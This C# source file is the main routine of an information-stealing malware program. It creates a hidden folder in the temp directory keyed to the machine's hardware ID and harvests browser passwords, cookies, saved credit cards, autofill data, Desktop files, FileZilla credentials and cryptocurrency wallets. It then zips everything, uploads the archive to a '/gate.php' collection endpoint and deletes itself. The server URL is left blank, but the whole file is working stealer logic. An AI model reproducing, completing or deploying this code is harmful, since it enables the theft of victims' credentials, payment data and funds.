using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
//using System.Linq;
using System.Text;

namespace NoFile
{
    class Program
    {
        private static string url = "";
        static void Main(string[] args)
        {
           
            
            string dir = Environment.GetEnvironmentVariable("temp") + "\\" + Helper.GetHwid();
            
            string workDir = dir + "\\Directory";
            string browserDir = workDir + "\\Browsers";
            string filesDir = workDir + "\\Files";
            string cryptoDir = workDir + "\\Wallets";

           Directory.CreateDirectory(workDir);
           Directory.CreateDirectory(browserDir);
           Directory.CreateDirectory(filesDir);
           Directory.CreateDirectory(cryptoDir);
            bool bl = false;
           string text = "";
           List<PassData> pwd = Browsers.GetPasswords();
           foreach (PassData i in pwd)
           {
               text += i.ToString();
           }
           File.WriteAllText(browserDir + "\\Passwords.txt", text);
           text = "";

          List<CookieData> cki = Browsers.GetCookies();
          foreach (CookieData i in cki)
           {
               text += i.ToString();
           }
           File.WriteAllText(browserDir + "\\Cookies.txt", text);
           text = "";

          List<CardData> cc = Browsers.GetCards();
          foreach (CardData i in cc)
           {
               text += i.ToString();
           }
           File.WriteAllText(browserDir + "\\CC.txt", text);
           text = "";

          List<FormData> frm = Browsers.GetForms();
          foreach (FormData i in frm)
           {
               text += i.ToString();
           }
           File.WriteAllText(browserDir + "\\Autofill.txt", text);
           text = "";

           Files.Desktop(filesDir);
           Files.FileZilla(filesDir);

           int wlt = Crypto.Steal(cryptoDir);

           string zipName = dir + "\\" + Helper.GetHwid() + ".zip";
           Helper.Zip(workDir, zipName);
           
           Helper.SendFile(string.Format(url + "/gate.php?hwid={0}&pwd={1}&cki={2}&cc={3}&frm={4}&wlt={5}", Helper.GetHwid(), pwd.Count, cki.Count, cc.Count, frm.Count, wlt), zipName);
            
                
           Helper.SelfDelete(dir,  dir + "\\temp.exe");
           
            // //Console.ReadKey();
            
        }
    }
}
